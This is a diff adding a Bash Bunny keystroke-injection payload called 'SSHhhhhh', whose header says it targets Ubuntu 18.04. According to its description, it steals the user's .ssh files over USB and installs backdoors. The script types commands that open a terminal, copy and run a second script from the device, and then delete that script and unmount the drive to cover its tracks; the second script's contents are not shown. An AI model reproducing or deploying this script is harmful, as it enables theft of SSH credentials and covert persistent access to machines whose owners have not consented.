@@ -1,0 +1,54 @@
+# Title:         SSHhhhhh
+# Description:   Exfiltrates files from user's .ssh folder to Bash Bunny via USB & adds backdoors
+# Author:        WWVB
+# Props:         Hak5Darren, hak5peaks
+# Version:       1.1
+# Category:      Exfiltration w/Persistence
+# Target:        Linux Ubuntu 18.04 LTS
+# Attackmodes:   HID, Storage
+
+DRIVE_LABEL="BashBunny"
+
+#!/bin/bash
+
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+LED  STAGE1
+QUACK DELAY 500
+QUACK CTRL-ALT t
+QUACK DELAY 100
+
+# Drop primary payload on the box
+QUACK STRING cp /media/\$USER/$DRIVE_LABEL/payloads/$SWITCH_POSITION/boom.sh .
+QUACK ENTER
+QUACK DELAY 50
+
+QUACK STRING chmod +x boom.sh
+QUACK ENTER
+QUACK DELAY 50
+
+LED ATTACK
+
+# Light the fuse and wait!!
+QUACK STRING ./boom.sh
+QUACK ENTER
+QUACK DELAY 1000
+
+# Cleanup
+LED CLEANUP
+QUACK STRING rm boom.sh
+QUACK ENTER
+QUACK DELAY 100
+
+# Bye Felicia!
+QUACK STRING umount '/media/$USER/$DRIVE_LABEL'
+QUACK ENTER
+QUACK DELAY 25
+
+QUACK STRING exit
+QUACK ENTER
+QUACK DELAY 25
+
+LED FINISH
